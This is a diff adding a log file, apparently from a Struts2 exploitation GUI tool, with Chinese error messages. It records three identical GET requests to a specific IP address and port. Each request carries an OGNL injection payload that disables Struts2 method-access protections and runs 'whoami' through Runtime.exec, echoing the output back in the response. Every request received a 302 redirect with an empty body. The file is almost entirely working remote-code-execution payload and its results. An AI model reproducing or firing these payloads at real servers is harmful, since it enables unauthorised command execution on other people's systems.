@@ -1,0 +1,27 @@
+2022-06-16 15:09:33 [ JavaFX Application Thread:22760 ] - [ ERROR ] HttpUtils get 响应失败. url=http://123.58.236.76:24029/index.action?('#_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('#context['xwork.MethodAccessor.denyMethodExecution']=false')(b))&('#c')(('#_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET')(c))&(g)(('#mycmd='whoami'')(d))&(h)(('#myret=@java.lang.Runtime@getRuntime().exec(#mycmd)')(d))&(i)(('#mydat=new java.io.DataInputStream(#myret.getInputStream())')(d))&(j)(('#myres=new byte[51020]')(d))&(k)(('#mydat.readFully(#myres)')(d))&(l)(('#mystr=new java.lang.String(#myres)')(d))&(m)(('#myout=@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('#myout.getWriter().println(#mystr)')(d))
+，headerMap={Content-type=application/x-www-form-urlencoded}, response=Response Headers: 
+    null=[HTTP/1.1 302]
+    Content-Length=[0]
+    Date=[Thu, 16 Jun 2022 07:09:34 GMT]
+    Location=[/example/HelloWorld.action]
+Response Body: 
+    
+
+2022-06-16 15:09:51 [ JavaFX Application Thread:40934 ] - [ ERROR ] HttpUtils get 响应失败. url=http://123.58.236.76:24029/index.action?('#_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('#context['xwork.MethodAccessor.denyMethodExecution']=false')(b))&('#c')(('#_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET')(c))&(g)(('#mycmd='whoami'')(d))&(h)(('#myret=@java.lang.Runtime@getRuntime().exec(#mycmd)')(d))&(i)(('#mydat=new java.io.DataInputStream(#myret.getInputStream())')(d))&(j)(('#myres=new byte[51020]')(d))&(k)(('#mydat.readFully(#myres)')(d))&(l)(('#mystr=new java.lang.String(#myres)')(d))&(m)(('#myout=@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('#myout.getWriter().println(#mystr)')(d))
+，headerMap={Content-type=application/x-www-form-urlencoded}, response=Response Headers: 
+    null=[HTTP/1.1 302]
+    Content-Length=[0]
+    Date=[Thu, 16 Jun 2022 07:09:52 GMT]
+    Location=[/example/HelloWorld.action]
+Response Body: 
+    
+
+2022-06-16 15:09:59 [ JavaFX Application Thread:48204 ] - [ ERROR ] HttpUtils get 响应失败. url=http://123.58.236.76:24029/index.action?('#_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('#context['xwork.MethodAccessor.denyMethodExecution']=false')(b))&('#c')(('#_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET')(c))&(g)(('#mycmd='whoami'')(d))&(h)(('#myret=@java.lang.Runtime@getRuntime().exec(#mycmd)')(d))&(i)(('#mydat=new java.io.DataInputStream(#myret.getInputStream())')(d))&(j)(('#myres=new byte[51020]')(d))&(k)(('#mydat.readFully(#myres)')(d))&(l)(('#mystr=new java.lang.String(#myres)')(d))&(m)(('#myout=@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('#myout.getWriter().println(#mystr)')(d))
+，headerMap={Content-type=application/x-www-form-urlencoded}, response=Response Headers: 
+    null=[HTTP/1.1 302]
+    Content-Length=[0]
+    Date=[Thu, 16 Jun 2022 07:09:59 GMT]
+    Location=[/example/HelloWorld.action]
+Response Body: 
+    
+
